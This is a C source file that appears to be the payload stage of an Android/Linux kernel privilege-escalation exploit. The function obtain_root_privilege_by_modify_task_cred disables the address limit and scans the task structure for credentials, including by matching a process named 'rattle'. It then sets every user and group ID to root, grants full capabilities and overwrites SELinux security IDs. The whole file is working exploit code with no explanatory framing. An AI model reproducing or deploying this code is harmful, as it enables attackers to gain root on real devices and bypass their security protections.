#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include "hack_data.h"
#include "crusty.h"

void *g_thread_info = NULL;
void *g_thread_task = NULL;
void *g_task_cred = NULL;
int g_task_comm = 0;
int g_cred_offset = 0;

static inline struct thread_info *
current_thread_info(void)
{
  register unsigned long sp asm ("sp");
  return (struct thread_info *)(sp & ~(THREAD_SIZE - 1));
}

static inline bool
is_cpu_timer_valid(struct list_head *cpu_timer)
{
  if (cpu_timer->next != cpu_timer->prev) {
    return false;
  }

  if ((unsigned long int)cpu_timer->next < KERNEL_START) {
    return false;
  }

  return true;
}

int inline in_strncmp(const char *s1, const char *s2, size_t n)
{
    for ( ; n > 0; s1++, s2++, --n) 
    {
        if (*s1 != *s2)
        {
            return ((*(unsigned char *)s1 < *(unsigned char *)s2) ? -1 : +1);
        }
        else if (*s1 == '\0')
        {
            return 0;
        }
    }
    return 0;
}

void
obtain_root_privilege_by_modify_task_cred(void)
{
  struct thread_info *info;
  struct cred *cred;
  struct task_security_struct *security;
  int i;
  unsigned long old_limit;
  char name[] = {'r', 'a', 't', 't', 'l', 'e'};

  info = current_thread_info();
  old_limit = info->addr_limit;
  info->addr_limit = -1;

  g_thread_info = info;
  g_thread_task = info->task;
  
  cred = NULL;
  
  for (i = 0; i < 0x400; i+= 4) {
    struct task_struct_partial *task = (void *)((unsigned long)info->task + i);

    if (is_cpu_timer_valid(&task->cpu_timers[0])
     && is_cpu_timer_valid(&task->cpu_timers[1])
     && is_cpu_timer_valid(&task->cpu_timers[2])
     && (unsigned long)task->cred >= old_limit
     && task->real_cred == task->cred) {
      cred = task->cred;
      g_cred_offset = i;
      g_task_cred = cred;
      break;
    }

    if(0 == in_strncmp(task->comm, name, 8)) {
      cred = task->cred;
      g_cred_offset = i;
      g_task_cred = cred;
      g_task_comm = task->comm;
      break;
    }
  }
    
  if (cred == NULL) {
    return;
  }
  
  cred->uid = 0;
  cred->gid = 0;
  cred->suid = 0;
  cred->sgid = 0;
  cred->euid = 0;
  cred->egid = 0;
  cred->fsuid = 0;
  cred->fsgid = 0;

  cred->cap_inheritable.cap[0] = 0xffffffff;
  cred->cap_inheritable.cap[1] = 0xffffffff;
  cred->cap_permitted.cap[0] = 0xffffffff;
  cred->cap_permitted.cap[1] = 0xffffffff;
  cred->cap_effective.cap[0] = 0xffffffff;
  cred->cap_effective.cap[1] = 0xffffffff;
  cred->cap_bset.cap[0] = 0xffffffff;
  cred->cap_bset.cap[1] = 0xffffffff;

  security = cred->security;
  if (security) {
    if (security->osid != 0
     && security->sid != 0
     && security->exec_sid == 0
     && security->create_sid == 0
     && security->keycreate_sid == 0
     && security->sockcreate_sid == 0) {
      security->osid = 1;
      security->sid = 1;
    }
  }
}